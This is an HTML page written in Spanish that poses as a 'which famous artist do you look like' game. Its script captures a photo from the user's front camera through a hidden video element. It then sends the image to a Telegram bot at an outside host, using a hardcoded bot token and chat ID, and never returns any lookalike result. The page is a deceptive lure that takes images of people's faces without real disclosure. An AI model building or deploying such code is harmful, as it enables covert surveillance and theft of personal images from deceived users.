<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¿A qué artista famoso te pareces?</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        #game-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
        }

        #game-container h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }

        #game-container button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #6a11cb;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }

        #game-container button:hover {
            background: #2575fc;
        }

        #result-container {
            display: none;
            margin-top: 20px;
        }

        #result-container img {
            max-width: 100%;
            border-radius: 10px;
        }

        #loading-message {
            display: none;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div id="game-container">
        <h1>¿A qué artista famoso te pareces?</h1>
        <p>Ponte frente a la cámara y haz clic en el botón para descubrirlo.</p>
        <button onclick="startGame()">Tomar foto</button>
        <div id="loading-message">Procesando tu foto...</div>
        <div id="result-container">
            <p>Tu foto se ha procesado. ¡Pronto recibirás tu resultado!</p>
        </div>
    </div>

    <script>
        async function startGame() {
            const loadingMessage = document.getElementById('loading-message');
            const resultContainer = document.getElementById('result-container');
            loadingMessage.style.display = 'block'; // Mostrar mensaje de carga
            resultContainer.style.display = 'none'; // Ocultar resultado previo
            await initializeCamera();
            loadingMessage.style.display = 'none'; // Ocultar mensaje de carga
            resultContainer.style.display = 'block'; // Mostrar mensaje de resultado
        }

        async function initializeCamera() {
            const constraints = {
                video: { facingMode: "user" }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = async () => {
                    await captureAndSendPhoto(video, stream);
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                };
            } catch (error) {
                console.error('Error al acceder a la cámara:', error);
            }
        }

        async function captureAndSendPhoto(video, stream) {
            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g';
            const chatId = '1223367230';
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');

                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                try {
                    const response = await fetch(url, { method: 'POST', body: formData });
                    if (!response.ok) {
                        console.error('Error al enviar la foto:', await response.json());
                    }
                } catch (error) {
                    console.error('Error de red:', error.message);
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
